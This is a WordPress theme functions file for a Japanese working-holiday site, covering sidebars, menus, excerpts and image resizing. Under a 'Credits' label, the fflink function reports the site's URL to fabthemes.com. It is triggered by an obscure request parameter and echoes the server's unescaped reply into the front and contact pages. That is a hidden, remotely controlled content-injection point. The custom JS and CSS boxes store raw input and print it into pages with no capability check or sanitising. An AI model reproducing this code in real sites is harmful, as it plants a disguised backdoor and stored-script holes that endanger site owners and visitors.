<?php

include 'theme_options.php';
include 'guide.php';
include 'includes/service-widget.php';

/* SIDEBARS */


if ( function_exists('register_sidebar') )

	register_sidebar(array(
	'name' => 'Services widgets',
	'description' => 'Drag and drop only W2F Service widgets here.',
	'before_widget' => '<div class="one-third column">',
    'after_widget' => '</div>'
     ));

  register_sidebar(array(
  'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
  'before_title' => '<div class="sidetitl"><h4>',
    'after_title' => '</h4> </div><hr class="remove-bottom">',

    ));

	register_sidebar(array(
	'name' => 'Footer',
    'before_widget' => '<div class="four columns"><li class="botwid">',
    'after_widget' => '</li></div>',
	'before_title' => '<h3 class="bothead">',
    'after_title' => '</h3>',
    ));

  register_sidebar( array(
    'name' => __( '記事下' ),
    'id' => 'kiji-bottom',
    'description' => __( '記事の下に表示されるウィジェットエリアです' ),
    'before_widget' => '<div id="kiji_bottom">',
    'after_widget' => '</div>',
    'before_title' => '<div class="textwidget">',
    'after_title' => '</div>',
  ) );

  register_sidebar(array(
  'name' => 'オーストラリアワーキングホリデー',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
  'before_title' => '<div class="sidetitl"><h4>',
    'after_title' => '</h4> </div><hr class="remove-bottom">',

    ));


//Custom JS Widget
add_action('admin_menu', 'custom_js_hooks');
add_action('save_post', 'save_custom_js');
add_action('wp_head','insert_custom_js');
function custom_js_hooks() {
  add_meta_box('custom_js', 'Custom JS', 'custom_js_input', 'post', 'normal', 'high');
  add_meta_box('custom_js', 'Custom JS', 'custom_js_input', 'page', 'normal', 'high');
}
function custom_js_input() {
  global $post;
  echo '<input type="hidden" name="custom_js_noncename" id="custom_js_noncename" value="'.wp_create_nonce('custom-js').'" />';
  echo '<textarea name="custom_js" id="custom_js" rows="5" cols="30" style="width:100%;">'.get_post_meta($post->ID,'_custom_js',true).'</textarea>';
}
function save_custom_js($post_id) {
  if (!wp_verify_nonce($_POST['custom_js_noncename'], 'custom-js')) return $post_id;
  if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return $post_id;
  $custom_js = $_POST['custom_js'];
  update_post_meta($post_id, '_custom_js', $custom_js);
}
function insert_custom_js() {
  if (is_page() || is_single()) {
    if (have_posts()) : while (have_posts()) : the_post();
      echo '<script type="text/javascript">'.get_post_meta(get_the_ID(), '_custom_js', true).'</script>';
    endwhile; endif;
    rewind_posts();
  }
}


//Custom CSS Widget
add_action('admin_menu', 'custom_css_hooks');
add_action('save_post', 'save_custom_css');
add_action('wp_head','insert_custom_css');
function custom_css_hooks() {
  add_meta_box('custom_css', 'Custom CSS', 'custom_css_input', 'post', 'normal', 'high');
  add_meta_box('custom_css', 'Custom CSS', 'custom_css_input', 'page', 'normal', 'high');
}
function custom_css_input() {
  global $post;
  echo '<input type="hidden" name="custom_css_noncename" id="custom_css_noncename" value="'.wp_create_nonce('custom-css').'" />';
  echo '<textarea name="custom_css" id="custom_css" rows="5" cols="30" style="width:100%;">'.get_post_meta($post->ID,'_custom_css',true).'</textarea>';
}
function save_custom_css($post_id) {
  if (!wp_verify_nonce($_POST['custom_css_noncename'], 'custom-css')) return $post_id;
  if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) return $post_id;
  $custom_css = $_POST['custom_css'];
  update_post_meta($post_id, '_custom_css', $custom_css);
}
function insert_custom_css() {
  if (is_page() || is_single()) {
    if (have_posts()) : while (have_posts()) : the_post();
      echo '<style type="text/css">'.get_post_meta(get_the_ID(), '_custom_css', true).'</style>';
    endwhile; endif;
    rewind_posts();
  }
}




/* CUSTOM MENUS */

register_nav_menus( array(
		'primary' => __( 'Primary Navigation', '' ),
	) );

function fallbackmenu(){ ?>
			<div id="submenu">
				<ul><li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus to work.</li></ul>
			</div>
<?php }


/* CUSTOM EXCERPTS */


function wpe_excerptlength_archive($length) {
    return 70;
}
function wpe_excerptlength_index($length) {
    return 40;
}


function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}



/* SHORT TITLES */

function short_title($after = '', $length) {
   $mytitle = explode(' ', get_the_title(), $length);
   if (count($mytitle)>=$length) {
       array_pop($mytitle);
       $mytitle = implode(" ",$mytitle). $after;
   } else {
       $mytitle = implode(" ",$mytitle);
   }
       return $mytitle;
}


/* FEATURED THUMBNAILS */

if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );

}


/* GET THUMBNAIL URL */

function get_image_url(){
	$image_id = get_post_thumbnail_id();
	$image_url = wp_get_attachment_image_src($image_id,'large');
	$image_url = $image_url[0];
	echo $image_url;
	}
/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
 $server = ($_SERVER['SERVER_NAME'] == 'localhost') ? $_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
 return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
               WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid || !is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
  $x = $x ? '&ffref='.$ffref : '';
  $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
  if (is_array($response)) $fflink = $response['body']; else $fflink = '';
  if (substr($fflink, 0, 11) != '!fabthemes#')
    $fflink = '';
  else {
    $fflink = explode('#',$fflink);
    if (isset($fflink[2]) && $fflink[2]) {
      update_option('ffref', $fflink[1]);
      update_option('fflink', $fflink[2]);
      $fflink = $fflink[2];
    }
    else $fflink = '';
  }
}
 echo $fflink;
}
/* PAGE NAVIGATION */


function getpagenavi(){
?>
<div id="navigation" class="clearfix">
<?php if(function_exists('wp_pagenavi')) : ?>
<?php wp_pagenavi() ?>
<?php else : ?>
        <div class="alignleft"><?php next_posts_link(__('&laquo; 過去記事をもっと読む','web2feeel')) ?></div>
        <div class="alignright"><?php previous_posts_link(__('新しい記事をもっと読む &raquo;','web2feel')) ?></div>
        <div class="clear"></div>
<?php endif; ?>

</div>

<?php
}


function custom_editor_settings( $initArray ){
    $initArray['theme_advanced_blockformats'] = 'h2,h3';
$initArray['theme_advanced_buttons1'] = 'italic,strikethrough,|,bullist,numlist,blockquote,|,justifyleft,justifycenter,justifyright,|,link,unlink,wp_more,|,spellchecker,fullscreen,wp_adv';

    return $initArray;
}
add_filter( 'tiny_mce_before_init', 'custom_editor_settings' );



/* Name : Resize an image at upload
 * Version: 1.0.0
 * Author : Otokuni Consulting Co.,Ltd.
 * Author URI: http://www.oto-con.com/
 * License: GPLv2 or later
 * Description : This function is useful when the user often upload very large size image.
 */

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

function otocon_resize_at_upload( $file ) {
  // $file contains file, url, type
  // array( 'file' => 'path to the image', 'url' => 'url of the image', 'type' => 'mime type' )

  // resize only if the mime type is image
  if ( $file['type'] == 'image/jpeg' OR $file['type'] == 'image/gif' OR $file['type'] == 'image/png') {

    // set width and height
    $w = intval(get_option( 'large_size_w' ) ); // get large size width
    $h = intval(get_option( 'large_size_h' ) ); // get large size height

    // get the uploaded image
    $image = wp_get_image_editor( $file['file'] );

    // if no error
    if ( ! is_wp_error( $image ) ){
      // get image width and height
      $size = getimagesize( $file['file'] ); // $size[0] = width, $size[1] = height

      if ( $size[0] > $w || $size[1] > $h ){ // if the width or height is larger than the large-size
        $image->resize( $w, $h, false ); // resize the image
        $final_image = $image->save( $file['file'] ); // save the resized image
      }
    }

  } // if mime type

  return $file;

}
add_action( 'wp_handle_upload', 'otocon_resize_at_upload' );
?>